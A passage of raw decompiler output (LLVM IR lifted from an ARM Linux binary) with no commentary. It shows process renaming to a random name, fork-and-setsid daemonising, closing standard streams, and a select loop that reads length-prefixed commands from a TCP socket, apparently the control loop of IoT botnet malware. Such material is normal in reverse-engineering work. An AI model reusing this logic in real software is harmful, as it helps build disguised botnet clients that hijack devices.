  %v1_10468 = call i32 @function_10bc0(i32 %v0_10464)
  %v2_10474 = call i32 @function_13a3c(i32 %v2_10460, i32 32)
  %v0_10478 = load i32, i32* @r8, align 4
  %v7_10478 = icmp eq i32 %v0_10478, 2
  br i1 %v7_10478, label %dec_label_pc_10580, label %dec_label_pc_10480

dec_label_pc_10480:                               ; preds = %dec_label_pc_10580, %dec_label_pc_1045c, %dec_label_pc_10590
  %v0_10480 = call i32 @function_10b68()
  %v1_10484 = mul i32 %v0_10480, 4
  %v3_10488 = and i32 %v1_10484, 12
  %v2_10490 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_10490, i32* @r5, align 4
  %v1_10494 = add nuw nsw i32 %v3_10488, 12
  store i32 %v1_10494, i32* @r4, align 4
  %v2_104a0 = call i32 @function_10c1c(i32 %v2_10490, i32 %v1_10494)
  %v2_104a8 = ptrtoint i32* %stack_var_-36 to i32
  %v1_104ac = load i32, i32* @r4, align 4
  %v2_104ac = add i32 %v1_104ac, %v2_104a8
  store i32 %v2_104ac, i32* %r3.global-to-local, align 4
  %v0_104b0 = load i32, i32* @r6, align 4
  %v1_104b0 = inttoptr i32 %v0_104b0 to i32*
  %v2_104b0 = load i32, i32* %v1_104b0, align 4
  store i32 %v2_104b0, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_104b8 = add i32 %v2_104ac, -134
  %v4_104b8 = inttoptr i32 %v3_104b8 to i8*
  store i8 0, i8* %v4_104b8, align 1
  %v2_104c0 = inttoptr i32 %v2_104b0 to i8*
  %v3_104c0 = call i32 @function_139c4(i8* %v2_104c0, i32 %v2_10490)
  %v0_104c4 = call i32 @function_10b68()
  %v2_104cc = urem i32 %v0_104c4, 6
  %v3_104d0 = mul nuw nsw i32 %v2_104cc, 4
  %v1_104d4 = add nuw nsw i32 %v3_104d0, 12
  store i32 %v1_104d4, i32* @r4, align 4
  %v2_104e0 = call i32 @function_10c1c(i32 %v2_10490, i32 %v1_104d4)
  store i32 %v2_104a8, i32* %r2.global-to-local, align 4
  %v1_104ec = load i32, i32* @r4, align 4
  %v2_104ec = add i32 %v1_104ec, %v2_104a8
  store i32 %v2_104ec, i32* %r3.global-to-local, align 4
  %v0_104f0 = load i32, i32* @r6, align 4
  %v1_104f0 = trunc i32 %v0_104f0 to i8
  %v3_104f0 = add i32 %v2_104ec, -134
  %v4_104f0 = inttoptr i32 %v3_104f0 to i8*
  store i8 %v1_104f0, i8* %v4_104f0, align 1
  %v5_104fc = call i32 @prctl(i32 15, i32 %v2_10490, i32 %v2_104a8, i32 %v2_104ec, i32 ptrtoint (i32* @0 to i32))
  %v1_10504 = call i32 @function_13074(i32 2)
  %v3_10510 = call i32 @function_12f90(i32 2, i32* nonnull %stack_var_-44)
  %v3_10514 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10514, i32* %r2.global-to-local, align 4
  %v3_10520 = inttoptr i32 %v3_10510 to i32*
  %v4_10520 = call i32 @write(i32 1, i32* %v3_10520, i32 %v3_10514)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10530 = call i32 @write(i32 ptrtoint (i32* @global_var_14374.201 to i32), i32* inttoptr (i32 1 to i32*), i32 1)
  %v1_10538 = call i32 @function_12fbc(i32 2)
  %v0_1053c = call i32 @fork()
  %v1_10540 = load i32, i32* @r6, align 4
  %v7_10544 = icmp sgt i32 %v0_1053c, %v1_10540
  br i1 %v7_10544, label %dec_label_pc_10548, label %dec_label_pc_105b8

dec_label_pc_10548:                               ; preds = %dec_label_pc_10480
  %v2_10554 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10554, i32* %r4.global-to-local, align 4
  store i32 %v6_10168, i32* %r5.global-to-local, align 4
  store i32 %v15_10168, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_10558:                               ; preds = %dec_label_pc_10168
  %v4_10560 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_14360.203, i32 0, i32 0), i32 2)
  %v3_10564 = icmp eq i32 %v4_10560, -1
  store i32 %v4_10560, i32* @r4, align 4
  br i1 %v3_10564, label %dec_label_pc_1020c, label %dec_label_pc_101e0

dec_label_pc_10574:                               ; preds = %dec_label_pc_102c8
  %v1_10578 = call i32 @raise(i32 5)
  br label %dec_label_pc_1045c

dec_label_pc_10580:                               ; preds = %dec_label_pc_1045c
  %v0_10580 = load i32, i32* @r6, align 4
  %v1_10580 = add i32 %v0_10580, 4
  %v2_10580 = inttoptr i32 %v1_10580 to i32*
  %v3_10580 = load i32, i32* %v2_10580, align 4
  %v1_10584 = inttoptr i32 %v3_10580 to i8*
  %v2_10584 = call i32 @function_1399c(i8* %v1_10584)
  %v8_1058c = icmp sgt i32 %v2_10584, 31
  br i1 %v8_1058c, label %dec_label_pc_10480, label %dec_label_pc_10590

dec_label_pc_10590:                               ; preds = %dec_label_pc_10580
  %v0_10590 = load i32, i32* @r6, align 4
  %v1_10590 = add i32 %v0_10590, 4
  %v2_10590 = inttoptr i32 %v1_10590 to i32*
  %v3_10590 = load i32, i32* %v2_10590, align 4
  store i32 %v2_10460, i32* @r0, align 4
  %v2_10598 = bitcast i32* %stack_var_-138 to i8*
  %v3_10598 = call i32 @function_139c4(i8* %v2_10598, i32 %v3_10590)
  %v0_1059c = load i32, i32* @r6, align 4
  %v1_1059c = add i32 %v0_1059c, 4
  %v2_1059c = inttoptr i32 %v1_1059c to i32*
  %v3_1059c = load i32, i32* %v2_1059c, align 4
  store i32 %v3_1059c, i32* %r4.global-to-local, align 4
  %v1_105a4 = inttoptr i32 %v3_1059c to i8*
  %v2_105a4 = call i32 @function_1399c(i8* %v1_105a4)
  %v0_105ac = load i32, i32* %r4.global-to-local, align 4
  %v2_105b0 = call i32 @function_13a3c(i32 %v0_105ac, i32 %v2_105a4)
  br label %dec_label_pc_10480

dec_label_pc_105b8:                               ; preds = %dec_label_pc_10480
  %v1_105b8 = call i32 @setsid()
  %v0_105c0 = load i32, i32* @r6, align 4
  %v1_105c4 = call i32 @close(i32 %v0_105c0)
  %v1_105cc = call i32 @close(i32 1)
  %v1_105d4 = call i32 @close(i32 2)
  %v2_105d8 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_105d8, i32* @r7, align 4
  %v1_105dc = call i32 @function_b2b0(i32 %v1_105d4)
  store i32 ptrtoint (i32* @global_var_1cca4.205 to i32), i32* @sb, align 4
  %v1_105e4 = call i32 @function_f808(i32 %v1_105dc)
  %v0_105e8 = call i32 @function_11624()
  %v0_105ec = load i32, i32* @r6, align 4
  %v2_105f4 = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_105f4, i32* @r6, align 4
  %v2_105f8 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_105f8, i32* @r7, align 4
  %tmp86 = bitcast i32* %stack_var_-592 to %_TYPEDEF_fd_set*
  %tmp87 = bitcast i32* %stack_var_-336 to %_TYPEDEF_fd_set*
  %tmp88 = bitcast i32* %stack_var_-60 to %timeval*
  %v2_10988 = ptrtoint i8* %stack_var_-38 to i32
  %v5_10994 = bitcast i8* %stack_var_-38 to i32*
  %v2_108bc = ptrtoint i32* %stack_var_-1616 to i32
  %v2_109ac = ptrtoint i32* %stack_var_-48 to i32
  %v1_10a40 = bitcast i32* %stack_var_-138 to i8*
  %tmp90 = bitcast i32* %stack_var_-88 to %sockaddr*
  br label %dec_label_pc_105fc

dec_label_pc_105fc:                               ; preds = %dec_label_pc_105fc.backedge, %dec_label_pc_105b8
  %v2_1060494 = phi i32 [ %v2_105f4, %dec_label_pc_105b8 ], [ %v2_1060494.pre, %dec_label_pc_105fc.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp14, %dec_label_pc_105b8 ], [ %stack_var_-37.0.be, %dec_label_pc_105fc.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_105ec, %dec_label_pc_105b8 ], [ %stack_var_-1620.0.be, %dec_label_pc_105fc.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1060496 = inttoptr i32 %v2_1060494 to i32*
  store i32 0, i32* %v4_1060496, align 4
  %v0_1060897 = load i32, i32* %r3.global-to-local, align 4
  %v1_1060898 = add i32 %v0_1060897, 4
  store i32 %v1_1060898, i32* %r3.global-to-local, align 4
  %v7_1060c99 = icmp eq i32 %v1_1060898, 128
  br i1 %v7_1060c99, label %dec_label_pc_10614, label %dec_label_pc_10604.dec_label_pc_10604_crit_edge

dec_label_pc_10604.dec_label_pc_10604_crit_edge:  ; preds = %dec_label_pc_105fc, %dec_label_pc_10604.dec_label_pc_10604_crit_edge
  %v1_10608100 = phi i32 [ %v1_10608, %dec_label_pc_10604.dec_label_pc_10604_crit_edge ], [ %v1_1060898, %dec_label_pc_105fc ]
  %v0_10604.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_10604 = load i32, i32* @r6, align 4
  %v3_10604 = add i32 %v2_10604, %v1_10608100
  %v4_10604 = inttoptr i32 %v3_10604 to i32*
  store i32 %v0_10604.pre, i32* %v4_10604, align 4
  %v0_10608 = load i32, i32* %r3.global-to-local, align 4
  %v1_10608 = add i32 %v0_10608, 4
  store i32 %v1_10608, i32* %r3.global-to-local, align 4
  %v7_1060c = icmp eq i32 %v1_10608, 128
  br i1 %v7_1060c, label %dec_label_pc_10614, label %dec_label_pc_10604.dec_label_pc_10604_crit_edge

dec_label_pc_10614:                               ; preds = %dec_label_pc_10604.dec_label_pc_10604_crit_edge, %dec_label_pc_105fc
  %v0_10614 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10614, i32* %r3.global-to-local, align 4
  store i32 %v0_10614, i32* %r4.global-to-local, align 4
  %v2_1061c101 = load i32, i32* @r7, align 4
  %v3_1061c102 = add i32 %v2_1061c101, %v0_10614
  %v4_1061c103 = inttoptr i32 %v3_1061c102 to i32*
  store i32 %v0_10614, i32* %v4_1061c103, align 4
  %v0_10620104 = load i32, i32* %r3.global-to-local, align 4
  %v1_10620105 = add i32 %v0_10620104, 4
  store i32 %v1_10620105, i32* %r3.global-to-local, align 4
  %v7_10624106 = icmp eq i32 %v1_10620105, 128
  br i1 %v7_10624106, label %dec_label_pc_1062c, label %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge

dec_label_pc_1061c.dec_label_pc_1061c_crit_edge:  ; preds = %dec_label_pc_10614, %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge
  %v1_10620107 = phi i32 [ %v1_10620, %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge ], [ %v1_10620105, %dec_label_pc_10614 ]
  %v0_1061c.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1061c = load i32, i32* @r7, align 4
  %v3_1061c = add i32 %v2_1061c, %v1_10620107
  %v4_1061c = inttoptr i32 %v3_1061c to i32*
  store i32 %v0_1061c.pre, i32* %v4_1061c, align 4
  %v0_10620 = load i32, i32* %r3.global-to-local, align 4
  %v1_10620 = add i32 %v0_10620, 4
  store i32 %v1_10620, i32* %r3.global-to-local, align 4
  %v7_10624 = icmp eq i32 %v1_10620, 128
  br i1 %v7_10624, label %dec_label_pc_1062c, label %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge

dec_label_pc_1062c:                               ; preds = %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge, %dec_label_pc_10614
  store i32 ptrtoint (i32* @global_var_1cca0.165 to i32), i32* %r3.global-to-local, align 4
  %v2_10630 = load i32, i32* @global_var_1cca0.165, align 4
  %v7_10634 = icmp eq i32 %v2_10630, -1
  br i1 %v7_10634, label %dec_label_pc_10664, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_1062c
  %v3_1063c = udiv i32 %v2_10630, 32
  %v3_10644 = mul nuw nsw i32 %v3_1063c, 4
  %v2_1064c = add i32 %v3_10644, %v2_104a8
  store i32 %v2_1064c, i32* %r3.global-to-local, align 4
  %v1_10650 = add i32 %v2_1064c, -556
  %v2_10650 = inttoptr i32 %v1_10650 to i32*
  %v3_10650 = load i32, i32* %v2_10650, align 4
  %v1_10654 = urem i32 %v2_10630, 32
  %v7_1065c = shl i32 1, %v1_10654
  %v8_1065c = or i32 %v3_10650, %v7_1065c
  store i32 %v8_1065c, i32* %r2.global-to-local, align 4
  store i32 %v8_1065c, i32* %v2_10650, align 4
  br label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %dec_label_pc_1062c, %dec_label_pc_1063c
  %v2_10664 = load i32, i32* @global_var_1cca4.205, align 4
  store i32 %v2_10664, i32* %r3.global-to-local, align 4
  %v7_10668 = icmp eq i32 %v2_10664, -1
  store i32 ptrtoint (i32* @global_var_1cca4.205 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_10668, label %dec_label_pc_1090c, label %dec_label_pc_10674

dec_label_pc_10674:                               ; preds = %dec_label_pc_1090c, %dec_label_pc_10664, %.thread
  store i32 ptrtoint (i8** @global_var_1ccfc.208 to i32), i32* %r2.global-to-local, align 4
  %v2_10678 = load i8, i8* bitcast (i8** @global_var_1ccfc.208 to i8*), align 4
  %v3_10678 = zext i8 %v2_10678 to i32
  store i32 %v3_10678, i32* %r3.global-to-local, align 4
  %v2_1067c = icmp eq i8 %v2_10678, 0
  %v2_107cc = load i32, i32* @global_var_1cca4.205, align 4
  %v3_107d4 = udiv i32 %v2_107cc, 32
  br i1 %v2_1067c, label %dec_label_pc_107cc, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %dec_label_pc_10674
  %v3_10690 = mul nuw nsw i32 %v3_107d4, 4
  %v2_10698 = add i32 %v3_10690, %v2_104a8
  store i32 %v2_10698, i32* %r3.global-to-local, align 4
  %v1_1069c = add i32 %v2_10698, -300
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  %v3_1069c = load i32, i32* %v2_1069c, align 4
  %v1_106a0 = urem i32 %v2_107cc, 32
  %v7_106a8 = shl i32 1, %v1_106a0
  %v8_106a8 = or i32 %v3_1069c, %v7_106a8
  store i32 %v8_106a8, i32* %r2.global-to-local, align 4
  store i32 %v8_106a8, i32* %v2_1069c, align 4
  br label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_107cc, %dec_label_pc_10684
  %v2_106b4 = load i32, i32* @global_var_1cca0.165, align 4
  %v2_106b8 = load i32, i32* @global_var_1cca4.205, align 4
  store i32 %v2_106b8, i32* %r3.global-to-local, align 4
  %v5_106c4 = icmp slt i32 %v2_106b4, %v2_106b8
  br i1 %v5_106c4, label %bb, label %bb91

bb:                                               ; preds = %dec_label_pc_106b0
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_106b0, %bb
  %v0_106d4 = phi i32 [ %v2_106b4, %dec_label_pc_106b0 ], [ %v2_106b8, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_106d4 = add i32 %v0_106d4, 1
  store i32 %v2_105f8, i32* %r2.global-to-local, align 4
  %v13_106ec = call i32 @select(i32 %v1_106d4, %_TYPEDEF_fd_set* %tmp86, %_TYPEDEF_fd_set* %tmp87, %_TYPEDEF_fd_set* null, %timeval* %tmp88)
  %v8_106f0 = icmp eq i32 %v13_106ec, -1
  store i32 %v13_106ec, i32* %r3.global-to-local, align 4
  br i1 %v8_106f0, label %dec_label_pc_105fc.backedge, label %dec_label_pc_106fc

dec_label_pc_106fc:                               ; preds = %bb91
  %v14_106ec = trunc i32 %v13_106ec to i8
  %v3_106fc = icmp eq i8 %v14_106ec, 0
  br i1 %v3_106fc, label %dec_label_pc_10704, label %dec_label_pc_1072c

dec_label_pc_10704:                               ; preds = %dec_label_pc_106fc
  store i8 0, i8* %stack_var_-38, align 1
  %v2_10714 = srem i32 %stack_var_-1620.0, 6
  %v2_1071c = icmp eq i32 %v2_10714, 0
  %v1_10720 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_10720, i32* %r2.global-to-local, align 4
  br i1 %v2_1071c, label %dec_label_pc_1097c, label %dec_label_pc_1072c

dec_label_pc_1072c:                               ; preds = %dec_label_pc_106fc, %dec_label_pc_10704, %dec_label_pc_1097c
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_1097c ], [ 0, %dec_label_pc_10704 ], [ %stack_var_-37.0, %dec_label_pc_106fc ]
  %stack_var_-1620.1 = phi i32 [ %v1_10720, %dec_label_pc_1097c ], [ %v1_10720, %dec_label_pc_10704 ], [ %stack_var_-1620.0, %dec_label_pc_106fc ]
  store i32 ptrtoint (i32* @global_var_1cca0.165 to i32), i32* %r3.global-to-local, align 4
  %v2_10730 = load i32, i32* @global_var_1cca0.165, align 4
  %v7_10734 = icmp eq i32 %v2_10730, -1
  br i1 %v7_10734, label %dec_label_pc_10764, label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_1072c
  %v3_1073c = udiv i32 %v2_10730, 32
  %v3_10744 = mul nuw nsw i32 %v3_1073c, 4
  store i32 %v2_104a8, i32* @ip, align 4
  %v2_1074c = add i32 %v3_10744, %v2_104a8
  store i32 %v2_1074c, i32* %r3.global-to-local, align 4
  %v1_10750 = add i32 %v2_1074c, -556
  %v2_10750 = inttoptr i32 %v1_10750 to i32*
  %v3_10750 = load i32, i32* %v2_10750, align 4
  %v1_10754 = urem i32 %v2_10730, 32
  %v6_10758 = lshr i32 %v3_10750, %v1_10754
  store i32 %v6_10758, i32* %r2.global-to-local, align 4
  %v1_1075c = urem i32 %v6_10758, 2
  %v2_1075c = icmp eq i32 %v1_1075c, 0
  store i1 %v2_1075c, i1* @cpsr_z, align 1
  br i1 %v2_1075c, label %dec_label_pc_10764, label %dec_label_pc_109fc

dec_label_pc_10764:                               ; preds = %dec_label_pc_1073c, %dec_label_pc_1072c
  store i32 ptrtoint (i8** @global_var_1ccfc.208 to i32), i32* %r3.global-to-local, align 4
  %v2_10768 = load i8, i8* bitcast (i8** @global_var_1ccfc.208 to i8*), align 4
  %v3_10768 = zext i8 %v2_10768 to i32
  store i32 %v3_10768, i32* %r4.global-to-local, align 4
  %v2_1076c = icmp eq i8 %v2_10768, 0
  %v2_107fc = load i32, i32* @global_var_1cca4.205, align 4
  br i1 %v2_1076c, label %dec_label_pc_107fc, label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %dec_label_pc_10764
  %v3_1077c = udiv i32 %v2_107fc, 32
  %v3_10784 = mul nuw nsw i32 %v3_1077c, 4
  %v2_10788 = add i32 %v3_10784, %v2_104a8
  store i32 %v2_10788, i32* %r3.global-to-local, align 4
  %v1_1078c = add i32 %v2_10788, -300
  %v2_1078c = inttoptr i32 %v1_1078c to i32*
  %v3_1078c = load i32, i32* %v2_1078c, align 4
  %v1_10790 = urem i32 %v2_107fc, 32
  %v6_10794 = lshr i32 %v3_1078c, %v1_10790
  store i32 %v6_10794, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ccfc.208 to i32), i32* %r3.global-to-local, align 4
  %v1_107a0 = urem i32 %v6_10794, 2
  %v2_107a0 = icmp eq i32 %v1_107a0, 0
  store i8 0, i8* bitcast (i8** @global_var_1ccfc.208 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1cca4.205 to i32), i32* @r5, align 4
  br i1 %v2_107a0, label %dec_label_pc_107b0, label %dec_label_pc_1099c

dec_label_pc_107b0:                               ; preds = %dec_label_pc_10774
  %v1_107b4 = icmp ne i32 %v2_107fc, -1
  call void @__pseudo_cond_branch(i1 %v1_107b4, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_107bc = load i32, i32* @r5, align 4
  %v2_107bc = inttoptr i32 %v1_107bc to i32*
  store i32 -1, i32* %v2_107bc, align 4
  %v1_107c4 = call i32 @sleep(i32 1)
  br label %dec_label_pc_105fc.backedge

dec_label_pc_105fc.backedge:                      ; preds = %dec_label_pc_107b0, %dec_label_pc_108e8, %dec_label_pc_109d4, %dec_label_pc_10a88, %dec_label_pc_10ab0, %dec_label_pc_10b20, %bb91, %dec_label_pc_107fc, %dec_label_pc_1080c, %dec_label_pc_10a3c, %bb93, %dec_label_pc_10acc, %dec_label_pc_10a9c
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb91 ], [ %stack_var_-37.1, %dec_label_pc_107fc ], [ %stack_var_-37.1, %dec_label_pc_1080c ], [ %stack_var_-37.3, %bb93 ], [ %stack_var_-37.2, %dec_label_pc_108e8 ], [ %stack_var_-37.1, %dec_label_pc_10ab0 ], [ %v3_10ae4, %dec_label_pc_10acc ], [ %v3_10ae4, %dec_label_pc_10b20 ], [ %stack_var_-37.1, %dec_label_pc_107b0 ], [ %stack_var_-37.1, %dec_label_pc_10a3c ], [ %stack_var_-37.1, %dec_label_pc_10a88 ], [ %stack_var_-37.1, %dec_label_pc_109d4 ], [ %stack_var_-37.3, %dec_label_pc_10a9c ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb91 ], [ %stack_var_-1620.1, %dec_label_pc_107fc ], [ %stack_var_-1620.1, %dec_label_pc_1080c ], [ %stack_var_-1620.1, %bb93 ], [ %stack_var_-1620.1, %dec_label_pc_108e8 ], [ %stack_var_-1620.1, %dec_label_pc_10ab0 ], [ %stack_var_-1620.1, %dec_label_pc_10acc ], [ %stack_var_-1620.1, %dec_label_pc_10b20 ], [ %stack_var_-1620.1, %dec_label_pc_107b0 ], [ %stack_var_-1620.1, %dec_label_pc_10a3c ], [ %stack_var_-1620.1, %dec_label_pc_10a88 ], [ %stack_var_-1620.1, %dec_label_pc_109d4 ], [ %stack_var_-1620.1, %dec_label_pc_10a9c ]
  %v2_1060494.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_105fc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_10674
  store i32 %v2_104a8, i32* %r2.global-to-local, align 4
  %v3_107dc = mul nuw nsw i32 %v3_107d4, 4
  %v2_107e0 = add i32 %v3_107dc, %v2_104a8
  store i32 %v2_107e0, i32* %r3.global-to-local, align 4
  %v1_107e4 = add i32 %v2_107e0, -556
  %v2_107e4 = inttoptr i32 %v1_107e4 to i32*
  %v3_107e4 = load i32, i32* %v2_107e4, align 4
  %v1_107e8 = urem i32 %v2_107cc, 32
  %v7_107f0 = shl i32 1, %v1_107e8
  %v8_107f0 = or i32 %v3_107e4, %v7_107f0
  store i32 %v8_107f0, i32* %r2.global-to-local, align 4
  store i32 %v8_107f0, i32* %v2_107e4, align 4
  br label %dec_label_pc_106b0

dec_label_pc_107fc:                               ; preds = %dec_label_pc_10764
  %v7_10800 = icmp eq i32 %v2_107fc, -1
  store i32 ptrtoint (i32* @global_var_1cca4.205 to i32), i32* @r5, align 4
  br i1 %v7_10800, label %dec_label_pc_105fc.backedge, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_107fc
  %v3_1080c = udiv i32 %v2_107fc, 32
  store i32 %v2_104a8, i32* %r2.global-to-local, align 4
  %v3_10818 = mul nuw nsw i32 %v3_1080c, 4
  %v2_1081c = add i32 %v3_10818, %v2_104a8
  store i32 %v2_1081c, i32* %r3.global-to-local, align 4
  %v1_10820 = add i32 %v2_1081c, -556
  %v2_10820 = inttoptr i32 %v1_10820 to i32*
  %v3_10820 = load i32, i32* %v2_10820, align 4
  %v1_10824 = urem i32 %v2_107fc, 32
  %v6_10828 = lshr i32 %v3_10820, %v1_10824
  store i32 %v6_10828, i32* %r2.global-to-local, align 4
  %v1_1082c = urem i32 %v6_10828, 2
  %v2_1082c = icmp eq i32 %v1_1082c, 0
  br i1 %v2_1082c, label %dec_label_pc_105fc.backedge, label %dec_label_pc_10834

dec_label_pc_10834:                               ; preds = %dec_label_pc_1080c
  %v0_10834 = call i32* @__errno_location()
  %v1_10834 = ptrtoint i32* %v0_10834 to i32
  %v0_10838 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10838, i32* %v0_10834, align 4
  store i32 %v1_10834, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_1084c = load i32, i32* @global_var_1cca4.205, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10858 = call i32 @_recv(i32 %v2_1084c, i32 %v2_10988, i32 2, i32 16386)
  %v7_1085c = icmp eq i32 %v4_10858, -1
  br i1 %v7_1085c, label %dec_label_pc_10a9c, label %dec_label_pc_10864

dec_label_pc_10864:                               ; preds = %dec_label_pc_10834
  %v2_10864 = icmp eq i32 %v4_10858, 0
  br i1 %v2_10864, label %dec_label_pc_108e8, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10864
  %v3_1086c = load i8, i8* %stack_var_-38, align 1
  %v4_1086c = sext i8 %v3_1086c to i32
  %v4_10870 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_10870, i32* %r3.global-to-local, align 4
  %v4_10874 = mul nuw nsw i32 %v4_10870, 256
  %v5_10874 = or i32 %v4_1086c, %v4_10874
  store i32 %v5_10874, i32* %r2.global-to-local, align 4
  %v7_10874 = icmp eq i32 %v5_10874, 0
  br i1 %v7_10874, label %dec_label_pc_10ab0, label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_1086c
  %v1_1087c = mul nsw i32 %v4_1086c, 256
  %v3_10880 = and i32 %v1_1087c, 65280
  %v4_10884 = udiv i32 %v5_10874, 256
  %v5_10884 = or i32 %v3_10880, %v4_10884
  store i32 %v5_10884, i32* %r3.global-to-local, align 4
  %v3_108885 = udiv i32 %v5_10884, 256
  store i32 %v3_108885, i32* %r2.global-to-local, align 4
  %v1_10890 = trunc i32 %v3_108885 to i8
  %v6_10894 = trunc i32 %v4_10884 to i8
  store i8 %v6_10894, i8* %stack_var_-38, align 1
  %tmp110 = icmp ult i32 %v5_10884, 1025
  br i1 %tmp110, label %dec_label_pc_108ac, label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %dec_label_pc_1087c
  %v2_1089c = load i32, i32* @global_var_1cca4.205, align 4
  %v1_108a0 = call i32 @close(i32 %v2_1089c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_108a8 = load i32, i32* @r5, align 4
  %v2_108a8 = inttoptr i32 %v1_108a8 to i32*
  store i32 -1, i32* %v2_108a8, align 4
  %v3_108b4.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %dec_label_pc_1087c, %dec_label_pc_1089c
  %v3_108b4 = phi i8 [ %v6_10894, %dec_label_pc_1087c ], [ %v3_108b4.pre, %dec_label_pc_1089c ]
  %v0_108ac = load i32, i32* %r4.global-to-local, align 4
  %v1_108ac = load i32, i32* @r8, align 4
  %v2_108ac = inttoptr i32 %v1_108ac to i32*
  store i32 %v0_108ac, i32* %v2_108ac, align 4
  %v4_108b0 = urem i32 %v3_108885, 256
  %v4_108b4 = sext i8 %v3_108b4 to i32
  store i32 %v2_108bc, i32* @r4, align 4
  %v4_108c4 = mul nuw nsw i32 %v4_108b0, 256
  %v5_108c4 = or i32 %v4_108b4, %v4_108c4
  store i32 %v5_108c4, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_108cc = load i32, i32* @global_var_1cca4.205, align 4
  %v4_108d4 = call i32 @_recv(i32 %v2_108cc, i32 %v2_108bc, i32 %v5_108c4, i32 16386)
  %v7_108d8 = icmp eq i32 %v4_108d4, -1
  br i1 %v7_108d8, label %dec_label_pc_10a9c, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108ac
  %v2_108e0 = icmp eq i32 %v4_108d4, 0
  br i1 %v2_108e0, label %dec_label_pc_108e8, label %dec_label_pc_10acc

dec_label_pc_108e8:                               ; preds = %bb93, %dec_label_pc_108e0, %dec_label_pc_10864
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb93 ], [ %stack_var_-37.1, %dec_label_pc_10864 ], [ %v1_10890, %dec_label_pc_108e0 ]
  %v2_108e8 = load i32, i32* @global_var_1cca4.205, align 4
  %v1_108f0 = icmp ne i32 %v2_108e8, -1
  call void @__pseudo_cond_branch(i1 %v1_108f0, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 ptrtoint (i32* @global_var_1cca4.205 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1cca4.205, align 4
  %v1_10904 = call i32 @sleep(i32 1)
  br label %dec_label_pc_105fc.backedge

dec_label_pc_1090c:                               ; preds = %dec_label_pc_10664
  %v0_10914 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10914, i32* %r2.global-to-local, align 4
  %v3_10918 = call i32 @socket(i32 2, i32 1, i32 %v0_10914)
  %v7_1091c = icmp eq i32 %v3_10918, -1
  store i32 %v3_10918, i32* %r5.global-to-local, align 4
  %v1_10924 = load i32, i32* %r8.global-to-local, align 4
  %v2_10924 = inttoptr i32 %v1_10924 to i32*
  store i32 %v3_10918, i32* %v2_10924, align 4
  br i1 %v7_1091c, label %dec_label_pc_10674, label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_1090c
  %v0_1092c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1092c, i32* %r2.global-to-local, align 4
  %v2_10934 = call i32 (i32, i32, ...) @fcntl(i32 %v3_10918, i32 3)
  %v1_1093c = or i32 %v2_10934, 2048
  store i32 %v1_1093c, i32* %r2.global-to-local, align 4
  %v0_10940 = load i32, i32* %r5.global-to-local, align 4
  %v2_10944 = call i32 (i32, i32, ...) @fcntl(i32 %v0_10940, i32 4)
